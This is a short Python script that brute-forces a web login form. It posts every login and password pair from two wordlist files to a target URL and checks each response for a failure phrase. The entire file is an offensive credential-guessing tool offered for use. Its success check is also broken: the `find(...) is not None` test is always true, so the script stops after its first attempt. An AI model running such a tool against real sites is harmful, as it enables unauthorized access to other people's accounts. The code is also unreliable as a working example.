import argparse
import os
import socket
import requests
import sys

__author__ = 'mwitas'


def connect(url, field_login, login, field_password, password, timeout):
    try:
        data = {field_login: login, field_password: password}
        r = requests.post(url, timeout=timeout, stream=True, data=data)
        r.close()
        return r

    except (requests.exceptions.ConnectionError, socket.timeout, requests.exceptions.ReadTimeout) as e:
        raise requests.exceptions.ConnectionError("Connection timeout")


def check_files(files):
    for file in files:
        if not os.path.isfile(file):
            raise FileNotFoundError("File " + file + " not found")


def count_lines(file):
    return sum(1 for l in open(file))


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("logins", help="File with logins. Every login in new line")
    parser.add_argument("passwords", help="File with passwords. Every password in new line")
    parser.add_argument("login_field", help="Name of login form field")
    parser.add_argument("password_field", help="Name of password form field")
    parser.add_argument("failed_keyword", help="Phrase in response, indicating failed login")
    parser.add_argument("url", help="URL of endpoint to brute force")
    parser.add_argument("-r", "--retry", dest="retry", help="Retry on connection error", action="store_true")
    parser.add_argument("-t", "--timeout", dest="timeout", help="Connection timeout in seconds", type=int, default=5)
    return parser.parse_args()


def main():
    args = parse_args()

    f_logins = args.logins
    f_passwords = args.passwords
    url = args.url

    try:
        check_files([f_logins, f_passwords])
    except FileNotFoundError as e:
        print(str(e))
        sys.exit(1)

    n_logins = count_lines(f_logins)
    n_passwords = count_lines(f_passwords)

    d_logins = open(f_logins)
    d_passwords = open(f_passwords)

    should_exit = False
    for i, line in enumerate(d_logins):
        login = line.rstrip('\n')

        for j, line2 in enumerate(d_passwords):
            password = line2.rstrip('\n')
            head = str(i*n_passwords+j+1) + "/" + str(n_logins*n_passwords) + "\t" + login + ":" + password + "\t"
            should_retry = True

            while should_retry:
                try:
                    r = connect(url, args.login_field, login, args.password_field, password, args.timeout)

                    if r.text.find(args.failed_keyword) is not None:
                        print(head + "Found failed keyword")
                        should_exit = True
                    else :
                        print(head)
                    break
                except requests.exceptions.ConnectionError:
                    print(head + "Connection error")
                    should_retry = args.retry

                if should_exit:
                    break

        if should_exit:
            break
        else:
            d_passwords.seek(0)


if __name__ == "__main__":
    main()